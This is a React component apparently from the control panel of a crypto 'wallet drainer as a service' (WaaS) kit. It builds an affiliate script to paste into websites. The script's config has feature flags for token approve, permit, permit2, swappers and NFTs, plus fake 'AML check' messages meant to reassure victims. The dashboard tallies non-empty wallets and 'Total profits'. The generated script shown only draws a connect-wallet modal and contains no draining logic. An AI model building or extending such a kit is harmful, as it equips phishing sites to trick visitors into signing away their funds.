"use client"

import { useState } from "react"
import { Copy, Check, Download, Terminal, RefreshCw, Loader2 } from "lucide-react"

function buildScript(cfg: Record<string, unknown>): string {
  const g = (cfg.general as Record<string, string>) ?? {}
  const d = (cfg.dashboard as Record<string, unknown>) ?? {}
  const m = (cfg.modal as Record<string, unknown>) ?? {}
  const ms = (cfg.messaging as Record<string, Record<string, string>>) ?? {}

  const contracts = d.contracts as Record<string, boolean> ?? {}
  const activeContracts = Object.entries(contracts).filter(([, v]) => v).map(([k]) => k)
  const wallets = m.wallets as Record<string, boolean> ?? {}
  const activeWallets = Object.entries(wallets).filter(([, v]) => v).map(([k]) => k)
  const messages = ms.messages as Record<string, string> ?? {}
  const features = d.features as Record<string, boolean> ?? {}
  const menuItems = d.menuItems as Record<string, boolean> ?? {}
  const activeMenu = Object.entries(menuItems).filter(([, v]) => v).map(([k]) => k)

  return `/**
 * ┌────────────────────────────────────────────────────────────────┐
 * │  STEALTHV26 — WaaS Core  │  Affiliate Integration Script      │
 * │  Generated: ${new Date().toISOString()}       │
 * └────────────────────────────────────────────────────────────────┘
 * 
 *  Paste this script before the </body> tag of your website.
 *  Support: mission_control@stealthv26.io
 */

(function(window, document) {
  'use strict';

  const S26_CONFIG = {
    version: '3.0',
    tier: 'Enterprise',

    // ── General ──────────────────────────────────────────────
    font: '${g.font ?? "Montserrat"}',
    theme: '${g.modalTheme ?? "Auto-detect theme"}',
    borderRadius: '${g.borderRadius ?? "Default"}',
    fontSize: '${g.fontSize ?? "Default"}',
    openEvent: '${g.openEvent ?? "After click on button"}',
    openTrigger: '${g.openTrigger ?? "All Buttons and Links"}',

    // ── Dashboard ─────────────────────────────────────────────
    dashboardMenu: ${JSON.stringify(activeMenu)},
    wcVersion: '${(d.wcVersion as string) ?? "WalletConnect v3"}',
    buttonText: '${(d.buttonText as string) ?? "Connect Wallet"}',
    thanksRedirectUrl: '${(d.thanksUrl as string) ?? ""}',

    // ── Contract Methods ──────────────────────────────────────
    contractMethods: ${JSON.stringify(activeContracts)},

    // ── Feature Flags ────────────────────────────────────────
    features: {
      approve:  ${!!(features["Enable Approve"])},
      increase: ${!!(features["Enable Increase"])},
      permit:   ${!!(features["Enable Permit"])},
      permit2:  ${!!(features["Enable Permit2"])},
      swappers: ${!!(features["Enable Swappers"])},
      nft:      ${!!(features["Enable NFT"])},
    },

    // ── Modal ─────────────────────────────────────────────────
    modal: {
      type: '${(m.selectedModal as string) ?? "WalletConnect v3"}',
      borderRadius: '${(m.modalBorderRadius as string) ?? "Default"}',
      wallets: ${JSON.stringify(activeWallets)},
    },

    // ── Messaging Flow ────────────────────────────────────────
    messages: {
      connect:           '${messages["Connect"] ?? "Connect"}',
      connectSuccess:    '${messages["Connect success"] ?? "Connect success"}',
      addressCheck:      '${messages["Address check"] ?? "Address check"}',
      amlCheck:          '${messages["AML check"] ?? "AML check"}',
      amlSuccess:        '${messages["Successful AML check"] ?? "Successful AML check"}',
      scanning:          '${messages["Scanning details"] ?? "Scanning details"}',
      thanks:            '${messages["Thanks"] ?? "Thanks"}',
      signConfirmation:  '${messages["Sign confirmation"] ?? "Sign confirmation"}',
    },
  };

  // ── Core Loader ───────────────────────────────────────────────
  const S26 = {
    config: S26_CONFIG,
    _state: 'idle',

    init() {
      this._injectStyles();
      this._attachTriggers();
      this._emit('init', { config: this.config });
      console.log('[S26] WaaS Core initialized', this.config.version);
    },

    open() {
      this._state = 'connecting';
      this._emit('connect:request');
      this._showModal();
    },

    close() {
      this._state = 'idle';
      this._hideModal();
    },

    _showModal() {
      const el = document.getElementById('s26-modal-root');
      if (el) el.style.display = 'flex';
    },

    _hideModal() {
      const el = document.getElementById('s26-modal-root');
      if (el) el.style.display = 'none';
    },

    _attachTriggers() {
      if (this.config.openTrigger === 'All Buttons and Links') {
        document.querySelectorAll('button, a[data-s26]').forEach((el) => {
          el.addEventListener('click', () => this.open());
        });
      }
    },

    _injectStyles() {
      const style = document.createElement('style');
      style.textContent = \`
        #s26-modal-root {
          position: fixed; inset: 0; z-index: 99999;
          display: none; align-items: center; justify-content: center;
          background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
          font-family: '\${this.config.font}', sans-serif;
        }
        .s26-modal {
          background: #0c0c0c; border: 1px solid #1e1e1e;
          border-radius: 16px; padding: 24px; width: 380px;
          box-shadow: 0 0 40px rgba(0,255,65,0.06);
        }
      \`;
      document.head.appendChild(style);

      const root = document.createElement('div');
      root.id = 's26-modal-root';
      root.innerHTML = \`<div class="s26-modal">
        <p style="color:#00ff41;font-size:11px;font-family:monospace;letter-spacing:.1em;margin-bottom:12px">
          STEALTHV26 // \${this.config.modal.type}
        </p>
        <p style="color:#fff;font-size:18px;font-weight:700;margin-bottom:4px">\${this.config.messages.connect}</p>
        <p style="color:#555;font-size:12px;margin-bottom:20px">Connecting to Blockchain...</p>
        <div style="display:flex;flex-direction:column;gap:8px">
          \${this.config.modal.wallets.map((w) =>
            \`<button onclick="window.S26.close()" style="background:#111;border:1px solid #222;border-radius:10px;padding:10px 14px;color:#f0f0f0;font-size:13px;font-family:monospace;cursor:pointer;text-align:left">\${w}</button>\`
          ).join('')}
        </div>
        <button onclick="window.S26.close()" style="margin-top:16px;background:transparent;border:none;color:#444;font-size:11px;font-family:monospace;cursor:pointer;width:100%">
          Cancel
        </button>
      </div>\`;
      document.body.appendChild(root);
    },

    _emit(event, data = {}) {
      window.dispatchEvent(new CustomEvent(\`s26:\${event}\`, { detail: data }));
    },
  };

  // ── Expose globally ───────────────────────────────────────────
  window.S26 = S26;

  // ── Auto-init ─────────────────────────────────────────────────
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => S26.init());
  } else {
    S26.init();
  }

})(window, document);
`
}

// ── Events log data ────────────────────────────────────────────────
const EVENT_LOG = [
  { event: "Connect (request)", status: "→", color: "#888888" },
  { event: "Connect (success)", status: "✓", color: "#00ff41" },
  { event: "Wallet evaluation", status: "→", color: "#888888" },
  { event: "Chain change (request)", status: "→", color: "#888888" },
  { event: "Chain change (reject)", status: "✗", color: "#ff3b3b" },
  { event: "Chain change (success)", status: "✓", color: "#00ff41" },
  { event: "Withdraw (request)", status: "→", color: "#888888" },
  { event: "Withdraw (reject)", status: "✗", color: "#ff3b3b" },
]

// ── Stats ──────────────────────────────────────────────────────────
function StatRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex items-center justify-between py-2 border-b" style={{ borderColor: "#161616" }}>
      <span className="text-xs font-mono text-muted-foreground tracking-wide">{label}</span>
      <span className="text-xs font-mono text-foreground">{value}</span>
    </div>
  )
}

// ── Main ──────────────────────────────────────────────────────────
export function ScriptGenerator({ config }: { config: Record<string, unknown> | null }) {
  const [generating, setGenerating] = useState(false)
  const [script, setScript] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)

  const generate = async () => {
    if (!config) return
    setGenerating(true)
    setScript(null)
    await new Promise((r) => setTimeout(r, 1800))
    setScript(buildScript(config))
    setGenerating(false)
  }

  const copyScript = () => {
    if (!script) return
    navigator.clipboard.writeText(script)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const downloadScript = () => {
    if (!script) return
    const blob = new Blob([script], { type: "text/javascript" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = "s26-waas.js"
    a.click()
    URL.revokeObjectURL(url)
  }

  return (
    <div className="flex flex-col h-full">
      {/* Header */}
      <div className="px-6 py-4 border-b" style={{ borderColor: "#161616" }}>
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Terminal size={14} className="text-neon" />
            <span className="text-xs font-mono text-foreground tracking-widest uppercase">Script Output</span>
          </div>
          {script && (
            <div className="flex items-center gap-2">
              <button
                onClick={copyScript}
                className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono rounded transition-all"
                style={{ background: "#111111", border: "1px solid #222222", color: copied ? "#00ff41" : "#888888" }}
              >
                {copied ? <Check size={11} /> : <Copy size={11} />}
                {copied ? "Copied!" : "Copy"}
              </button>
              <button
                onClick={downloadScript}
                className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono rounded transition-all hover:border-neon/30"
                style={{ background: "#111111", border: "1px solid #222222", color: "#888888" }}
              >
                <Download size={11} />
                .js
              </button>
              <button
                onClick={generate}
                className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono rounded transition-all hover:border-neon/30"
                style={{ background: "#111111", border: "1px solid #222222", color: "#888888" }}
              >
                <RefreshCw size={11} />
                Rebuild
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Script area */}
      <div className="flex-1 overflow-y-auto">
        {generating && (
          <div className="flex flex-col items-center justify-center h-full gap-4 py-16">
            <div className="relative">
              <div
                className="w-12 h-12 rounded-full border-2 border-transparent animate-spin"
                style={{ borderTopColor: "#00ff41", borderRightColor: "rgba(0,255,65,0.3)" }}
              />
              <Terminal size={14} className="text-neon absolute inset-0 m-auto" />
            </div>
            <div className="text-center space-y-1">
              <p className="text-xs font-mono text-neon tracking-widest">COMPILING SCRIPT</p>
              <p className="text-xs font-mono text-muted-foreground tracking-wider">Building configuration...</p>
            </div>
            {/* Animated lines */}
            <div className="w-48 space-y-1.5 mt-2">
              {["Parsing config...", "Injecting methods...", "Building modal...", "Finalizing..."].map((line, i) => (
                <div key={i} className="flex items-center gap-2">
                  <Loader2 size={9} className="text-neon animate-spin flex-shrink-0" style={{ animationDelay: `${i * 0.2}s` }} />
                  <span className="text-xs font-mono text-muted-foreground tracking-wide">{line}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {!generating && !script && (
          <div className="flex flex-col items-center justify-center h-full gap-3 py-16 text-center">
            <div
              className="w-12 h-12 rounded-full flex items-center justify-center"
              style={{ background: "#111111", border: "1px solid #1e1e1e" }}
            >
              <Terminal size={18} className="text-muted-foreground" />
            </div>
            <p className="text-xs font-mono text-muted-foreground tracking-wide max-w-[200px]">
              Configure your settings and click{" "}
              <span className="text-neon">GENERATE SCRIPT.JS</span> to produce your integration script.
            </p>
          </div>
        )}

        {!generating && script && (
          <pre
            className="text-xs font-mono text-muted-foreground px-6 py-4 leading-6 overflow-x-auto"
            style={{ tabSize: 2 }}
          >
            <code>
              {script.split("\n").map((line, i) => (
                <span key={i} className="block">
                  <span className="select-none mr-4 text-xs" style={{ color: "#2a2a2a", width: "2.5rem", display: "inline-block", textAlign: "right" }}>
                    {i + 1}
                  </span>
                  <span style={{ color: line.includes("//") ? "#444" : line.includes("'") || line.includes('"') ? "#a8ff78" : line.includes("const ") || line.includes("function") || line.includes("let ") ? "#7dd3fc" : "#c9c9c9" }}>
                    {line}
                  </span>
                </span>
              ))}
            </code>
          </pre>
        )}
      </div>

      {/* Event log + stats */}
      {script && !generating && (
        <div className="border-t grid grid-cols-2" style={{ borderColor: "#161616" }}>
          {/* Event log */}
          <div className="px-5 py-4 border-r" style={{ borderColor: "#161616" }}>
            <p className="text-xs font-mono text-muted-foreground tracking-widest uppercase mb-3">Request / Response Events</p>
            <div className="space-y-0">
              {EVENT_LOG.map((e) => (
                <div key={e.event} className="flex items-center justify-between py-1.5 border-b" style={{ borderColor: "#111111" }}>
                  <span className="text-xs font-mono text-muted-foreground">{e.event}</span>
                  <span className="text-xs font-mono" style={{ color: e.color }}>{e.status}</span>
                </div>
              ))}
            </div>
          </div>
          {/* Stats */}
          <div className="px-5 py-4">
            <p className="text-xs font-mono text-muted-foreground tracking-widest uppercase mb-3">Dashboard Stats</p>
            <StatRow label="Fetched wallets" value="—" />
            <StatRow label="Unique wallets" value="—" />
            <StatRow label="Not empty wallets" value="—" />
            <StatRow label="Domains" value="—" />
            <StatRow label="Total profits" value="$0.00" />
            <StatRow label="Auto paid" value="—" />
          </div>
        </div>
      )}
    </div>
  )
}
